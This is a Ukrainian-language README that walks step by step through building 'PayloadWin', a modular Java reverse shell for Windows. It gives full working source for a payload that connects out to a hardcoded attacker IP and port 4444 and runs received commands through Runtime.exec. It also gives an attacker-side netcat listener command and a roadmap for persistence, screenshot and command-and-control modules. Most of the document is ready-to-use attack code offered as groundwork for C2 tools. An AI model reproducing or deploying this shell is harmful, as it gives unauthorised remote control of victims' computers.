# 🛠 PayloadWin — Java Reverse Shell (модульна архітектура)

## 🎯 Мета проєкту

Створити масштабований reverse shell для Windows на Java з модульною архітектурою, що дозволяє:
- запускати системні команди (`exec`)
- додавати нові модулі (post-exploitation: download, screenshot, persist)
- структурувати код за принципами Command Pattern
- підготувати фундамент для майбутніх C2-інструментів

## 📁 Структура проєкту

```
PayloadWin/
├── reverse_shell/
│   ├── Main.java                 # Точка входу
│   ├── Dispatcher.java           # Маршрутизація команд
│   ├── CommandHandler.java       # Інтерфейс модулів
│   └── modules/
│       └── ShellCommand.java     # Модуль виконання команд
├── .gitignore
└── README.md
```

## ⚙️ Кроки створення

### 🔹 Крок 1. Ініціалізація

```bash
mkdir PayloadWin && cd PayloadWin
git init
gh repo create PayloadWin --public --source=. --remote=origin --push
```

### 🔹 Крок 2. Створення інтерфейсу `CommandHandler`

`reverse_shell/CommandHandler.java`

```java
package reverse_shell;

import java.net.Socket;

public interface CommandHandler {
    void handle(String[] args, Socket socket) throws Exception;
}
```

### 🔹 Крок 3. Створення Dispatcher

`reverse_shell/Dispatcher.java`

```java
package reverse_shell;

import java.net.Socket;
import java.util.HashMap;
import java.util.Map;
import reverse_shell.modules.ShellCommand;

public class Dispatcher {
    private Map<String, CommandHandler> commands = new HashMap<>();

    public Dispatcher() {
        commands.put("exec", new ShellCommand());
    }

    public void dispatch(String input, Socket socket) throws Exception {
        String[] parts = input.trim().split(" ", 2);
        String cmd = parts[0];
        String[] args = (parts.length > 1) ? parts[1].split(" ") : new String[0];

        CommandHandler handler = commands.get(cmd);
        if (handler != null) {
            handler.handle(args, socket);
        } else {
            socket.getOutputStream().write(("Unknown command: " + cmd + "\n").getBytes());
        }
    }
}
```

### 🔹 Крок 4. Модуль виконання команд

`reverse_shell/modules/ShellCommand.java`

```java
package reverse_shell.modules;

import reverse_shell.CommandHandler;
import java.io.*;
import java.net.Socket;

public class ShellCommand implements CommandHandler {
    @Override
    public void handle(String[] args, Socket socket) throws Exception {
        PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
        String command = String.join(" ", args);

        Process process = Runtime.getRuntime().exec(command);
        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));

        String line;
        while ((line = reader.readLine()) != null) out.println(line);
        while ((line = errorReader.readLine()) != null) out.println(line);

        process.waitFor();
    }
}
```

### 🔹 Крок 5. Основний клас

`reverse_shell/Main.java`

```java
package reverse_shell;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.Socket;

public class Main {
    public static void main(String[] args) {
        String host = "192.168.1.184"; // ← Вказати свою IP
        int port = 4444;

        try {
            Socket socket = new Socket(host, port);
            BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            Dispatcher dispatcher = new Dispatcher();

            String input;
            while ((input = reader.readLine()) != null) {
                dispatcher.dispatch(input, socket);
            }

            socket.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

## 🧪 Тестування

### 1. Слухати з боку атакуючого:

```bash
nc -lvnp 4444
```

### 2. Компілювати:

```bash
javac reverse_shell/*.java reverse_shell/modules/*.java
```

### 3. Запустити:

```bash
java reverse_shell.Main
```

### 4. Надіслати в nc:

```
exec whoami
```

## ✅ Далі

- [ ] Додати модуль `download`
- [ ] Додати `screenshot`
- [ ] Додати `persist`
- [ ] Серіалізувати комунікацію (JSON/протокол)
- [ ] C2-архітектура / reconnect